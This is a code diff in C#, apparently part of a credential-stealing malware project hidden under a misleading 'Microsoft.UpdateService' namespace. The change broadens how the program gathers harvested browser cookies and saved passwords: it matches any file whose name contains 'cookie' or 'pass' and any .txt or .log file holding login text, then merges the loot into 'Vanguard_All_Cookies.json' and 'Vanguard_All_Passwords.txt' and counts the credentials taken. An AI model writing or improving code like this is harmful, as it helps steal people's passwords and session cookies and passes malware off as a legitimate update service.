@@ -132,36 +132,44 @@ namespace Microsoft.UpdateService.Modules
                 foreach (var file in files)
                 {
                     string name = Path.GetFileName(file).ToLower();
-                    if (name == "cookies.json")
-                    {
-                        try {
-                            var json = JArray.Parse(File.ReadAllText(file));
-                            foreach (var item in json) allCookies.Add(item);
-                            totalCookies += json.Count;
-                        } catch { }
-                    }
-                    else if (name == "passwords.txt")
+                    
+                    // Improved matching: find ANY file containing "cookie" or "pass"
+                    if (name.Contains("cookie"))
                     {
                         try {
                             string content = File.ReadAllText(file);
-                            if (content.Contains("URL:")) {
-                                string browserName = Path.GetFileName(Path.GetDirectoryName(Path.GetDirectoryName(file)) ?? "Unknown");
-                                allPasswords.AppendLine($"--- SOURCE: {browserName} ---");
+                            if (content.Trim().StartsWith("[")) // JSON Array
+                            {
+                                var json = JArray.Parse(content);
+                                foreach (var item in json) allCookies.Add(item);
+                                totalCookies += json.Count;
+                            }
+                        } catch { }
+                    }
+                    else if (name.Contains("pass") || name.EndsWith(".txt") || name.EndsWith(".log"))
+                    {
+                        try {
+                            string content = File.ReadAllText(file);
+                            if (content.Contains("URL:") || content.Contains("Password:") || content.Contains("Login:")) 
+                            {
+                                string parentDir = Path.GetFileName(Path.GetDirectoryName(file)) ?? "Unknown";
+                                allPasswords.AppendLine($"--- SOURCE: {parentDir} ({name}) ---");
                                 allPasswords.AppendLine(content);
                                 allPasswords.AppendLine(Environment.NewLine);
                                 
-                                // Basic regex to count credentials in passwords.txt
-                                totalPasswords += Regex.Matches(content, "URL:").Count;
+                                // Count matches of "URL:" as proxy for credential count
+                                int matches = Regex.Matches(content, "URL:", RegexOptions.IgnoreCase).Count;
+                                totalPasswords += (matches > 0 ? matches : 1);
                             }
                         } catch { }
                     }
                 }
 
                 if (totalCookies > 0)
-                    File.WriteAllText(Path.Combine(rootDir, "all_cookies.json"), allCookies.ToString());
+                    File.WriteAllText(Path.Combine(rootDir, "Vanguard_All_Cookies.json"), allCookies.ToString());
                 
                 if (totalPasswords > 0)
-                    File.WriteAllText(Path.Combine(rootDir, "all_passwords.txt"), allPasswords.ToString());
+                    File.WriteAllText(Path.Combine(rootDir, "Vanguard_All_Passwords.txt"), allPasswords.ToString());
             }
             catch (Exception ex) { Log($"[BROWSER] Consolidation error: {ex.Message}"); }
 
